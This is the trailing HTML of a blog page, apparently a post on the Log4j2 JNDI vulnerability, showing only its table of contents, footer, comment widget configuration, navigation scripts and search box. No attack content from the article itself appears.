class="toc-link" href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%9F%A5%E8%AF%A2"><span class="toc-text">字符串查询</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JNDI%E6%9F%A5%E8%AF%A2"><span class="toc-text">JNDI查询</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%AE"><span class="toc-text">安全建议</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BC%93%E8%A7%A3%E6%8E%AA%E6%96%BD"><span class="toc-text">缓解措施</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%89%88%E6%9C%AC%E5%8D%87%E7%BA%A7"><span class="toc-text">版本升级</span></a></li></ol></li></ol></div></div></div></div></main><footer id="footer" style="background-image: url('/img/post/cve-2021-44228-log4j2-jndi-attack/0.png')"><div id="footer-wrap"><div class="copyright">&copy;2019 - 2024 By _0xf4n9x_</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener external nofollow noreferrer" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="Scroll To Comments"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="Back To Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><script>function loadGitalk () {
  function initGitalk () {
    var gitalk = new Gitalk(Object.assign({
      clientID: '127fd27133c8e286cff8',
      clientSecret: 'f87b94b8813bcdae62b09baa633f85ef1a78107f',
      repo: '0xf4n9x.github.io',
      owner: '0xf4n9x',
      admin: ['0xf4n9x'],
      id: '9610eb7f7646079733a97e65faedd293',
      updateCountCallback: commentCount
    },null))

    gitalk.render('gitalk-container')
  }

  if (typeof Gitalk === 'function') initGitalk()
  else {
    getCSS('https://cdn.jsdelivr.net/npm/gitalk/dist/gitalk.min.css')
    getScript('https://cdn.jsdelivr.net/npm/gitalk/dist/gitalk.min.js').then(initGitalk)
  }
}

function commentCount(n){
  let isCommentCount = document.querySelector('#post-meta .gitalk-comment-count')
  if (isCommentCount) {
    isCommentCount.textContent= n
  }
}

if ('Gitalk' === 'Gitalk' || !false) {
  if (false) btf.loadComment(document.getElementById('gitalk-container'), loadGitalk)
  else loadGitalk()
} else {
  function loadOtherComment () {
    loadGitalk()
  }
}</script></div><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]

var pjax = new Pjax({
  elements: 'a:not([target="_blank"])',
  selectors: pjaxSelectors,
  cacheBust: false,
  analytics: true,
  scrollRestoration: false
})

document.addEventListener('pjax:send', function () {

  // removeEventListener scroll 
  window.tocScrollFn && window.removeEventListener('scroll', window.tocScrollFn)
  window.scrollCollect && window.removeEventListener('scroll', scrollCollect)

  document.getElementById('rightside').style.cssText = "opacity: ''; transform: ''"
  
  if (window.aplayers) {
    for (let i = 0; i < window.aplayers.length; i++) {
      if (!window.aplayers[i].options.fixed) {
        window.aplayers[i].destroy()
      }
    }
  }

  typeof typed === 'object' && typed.destroy()

  //reset readmode
  const $bodyClassList = document.body.classList
  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')

  typeof disqusjs === 'object' && disqusjs.destroy()
})

document.addEventListener('pjax:complete', function () {
  window.refreshFn()

  document.querySelectorAll('script[data-pjax]').forEach(item => {
    const newScript = document.createElement('script')
    const content = item.text || item.textContent || item.innerHTML || ""
    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
    newScript.appendChild(document.createTextNode(content))
    item.parentNode.replaceChild(newScript, item)
  })

  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()

  typeof panguInit === 'function' && panguInit()

  // google analytics
  typeof gtag === 'function' && gtag('config', 'G-YRH7DCY1TL', {'page_path': window.location.pathname});

  // baidu analytics
  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);

  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()

  // prismjs
  typeof Prism === 'object' && Prism.highlightAll()
})

document.addEventListener('pjax:error', (e) => {
  if (e.request.status === 404) {
    pjax.loadUrl('/404.html')
  }
})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">Search</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  Loading the Database</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search for Posts" type="text"/></div></div><hr/><div class="no-result" id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>